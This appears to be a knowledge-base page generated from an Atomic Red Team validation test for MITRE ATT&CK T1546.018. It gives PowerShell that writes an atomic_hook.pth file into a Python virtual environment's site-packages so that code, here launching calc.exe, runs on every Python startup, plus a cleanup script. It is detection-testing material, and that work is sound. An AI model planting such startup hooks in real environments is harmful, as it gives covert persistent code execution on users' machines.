---
atomic_guid: "57289962-21dc-4501-b756-80cd30608d9f"
title: "Python Startup Hook - atomic_hook.pth (Windows)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.018"
attack_technique_name: "Event Triggered Execution: Python Startup Hooks"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.018/T1546.018.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "57289962-21dc-4501-b756-80cd30608d9f"
  - "Python Startup Hook - atomic_hook.pth (Windows)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Executes code by placing a .pth file in the site-packages directory. 
Supports python.exe and python3.exe via input arguments.

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution#^t1546018-python-startup-hooks|T1546.018: Python Startup Hooks]]

## Input Arguments

### python_exe

- description: The python binary name to test.
- type: String
- default: python.exe

## Dependencies

Python must be installed and the specified binary (#{python_exe}) must be in the PATH.

### Prerequisite Check

```powershell
if (Get-Command @("#{python_exe}", 'python3.exe') -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
```

### Get Prerequisite

```powershell
Write-Host "[!] Python3 not found. Please install Python3 (e.g., winget install python3 or winget install python or https://www.python.org/downloads/windows/) or ensure it is in your PATH."
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
$TempDir = Join-Path $env:TEMP "atomic_pth_win"
New-Item -ItemType Directory -Path $TempDir -Force
& "#{python_exe}" -m venv "$TempDir\env"
$SitePackages = & "$TempDir\env\Scripts\python.exe" -c "import site; print(site.getsitepackages()[1])"
"import os, subprocess; os.environ.get('CALC_SPAWNED') or (os.environ.update({'CALC_SPAWNED':'1'}) or subprocess.Popen(['calc.exe']))" | Out-File -Encoding ASCII "$SitePackages\atomic_hook.pth"
Get-ChildItem -Path "$SitePackages" | Where-Object { $_.Name -like "*.pth" }
& "$TempDir\env\Scripts\python.exe" -c "print('Triggering Hook via atomic_hook...')"
```

### Cleanup

```powershell
if (-not (Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue | Where-Object Name -like 'atomic_pth_win')) { Write-Host "[!] Artifact missing: $env:Temp\atomic_pth_win Folder - [-] Please Run : Invoke-AtomicTest T1546.018"; exit 1 };
Remove-Item -Path "$env:TEMP\atomic_pth_win" -Recurse -Force
Write-Host "[+] Successfully Removed atomic_pth_win folder and atomic_hook.pth from Temp Directory"
Get-Process -Name "Calc*" -ErrorAction SilentlyContinue | Stop-Process -Force
Get-Process -Name "calc*" -ErrorAction SilentlyContinue | Stop-Process -Force
Write-Host "[+] Successfully Terminated Calculator"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.018/T1546.018.yaml)
